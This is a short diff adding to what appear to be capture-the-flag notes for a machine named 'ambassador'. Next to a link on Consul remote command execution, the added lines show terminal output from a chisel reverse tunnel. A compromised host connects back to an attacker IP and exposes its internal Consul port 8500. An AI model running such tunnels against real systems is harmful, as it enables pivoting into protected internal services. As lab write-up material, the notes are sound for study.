@@ -471,3 +471,16 @@ Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use p
 ```
 
 https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960
+
+```
+└──╼ [★]$ chisel server --reverse --port 1235
+2022/10/04 17:41:49 server: Reverse tunnelling enabled
+2022/10/04 17:41:49 server: Fingerprint tVqvYjj0bVDgalAncKCfbyHOT/3CAWGABoc06Fv/dcc=
+2022/10/04 17:41:49 server: Listening on http://0.0.0.0:1235
+2022/10/04 18:01:46 server: session#1: tun: proxy#R:8500=>8500: Listening
+```
+```
+developer@ambassador:/tmp$ ./chisellinuxamd64 client 10.10.14.63:1235 R:8500:127.0.0.1:8500
+2022/10/04 17:01:34 client: Connecting to ws://10.10.14.63:1235
+2022/10/04 17:01:34 client: Connected (Latency 3.369374ms)
+```
